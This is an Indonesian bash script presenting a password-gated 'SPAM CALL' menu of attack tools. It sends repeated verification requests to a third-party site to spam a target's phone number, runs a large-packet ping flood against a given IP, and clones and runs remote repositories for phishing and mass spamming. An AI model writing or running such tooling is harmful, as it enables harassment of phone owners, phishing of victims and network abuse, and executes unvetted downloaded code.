#!/bin/bash

clear
figlet LOGIN | lolcat
qu="Selamat Datang "
	read -p "Masukkan Nama Anda :" nama;
	read -p "Masukkan Pasword Tools :" pass;
	sleep 0.1
echo
echo $qu $nama
	sleep 0.1

if [ $pass = "subrek" ]
	then
	echo
	echo -e "\033[1;94mPASSWORD BENAR"
	sleep 2
	else
	echo -e "\033[1;91mPASSWORD SALAH!!"
	bash toraja.sh
	sleep 2
fi
clear

figlet SPAM CALL | lolcat
echo -e "________________________________"
echo -e "   \033[1;91mAUTHOR \033[1;97m ARYA NUGRAHA "
echo -e "   \033[1;91m YOUTUBE\033[1;97m ARYA TZY "
echo -e "________________________________"
echo -e "   \033[1;91m  [[\033[1;97m PRIVATE TOOLS \033[1;91m]]"
echo -e '
[1], Prank
[2], stabilkan jaringan
[3], Phising
[4], Spam All
[0], Exit Tools
'
echo
read -p "Pilih Nomor : " pil;
if [[ $pil == 1 ]]; then
read -p "Masukkan Nomor Target : " nomor;

link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
sleep 2
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link


bash toraja.sh
elif [[ $pil == 2 ]]; then
read -p "Masukkan Ip Andress Anda :" nomor;
clear
figlet Stabilkan Jaringan | lolcat
echo 'Stabilkan Jaringan Author Arya Nugraha'
ping -s 1000 $nomor
elif [[ $pil == 3 ]]; then
clear
sleep 3
echo "loading..."
sleep 2
echo "proses..."
git clone https://github.com/reyspeed/phish-all
cd phish-all
bash croot.sh
clear

elif [[ $pil == 4 ]]; then
clear
figlet Wait | lolcat
echo 'mohon tunggu 5 detik'
sleep 5
echo 'selesai'
git clone https://github.com/4L13199/LITESPAM
cd LITESPAM
sh LITESPAM.sh

else
clear
figlet Good Bye | lolcat
echo 'thx udah pakai tools ini'
exit
fi
echo

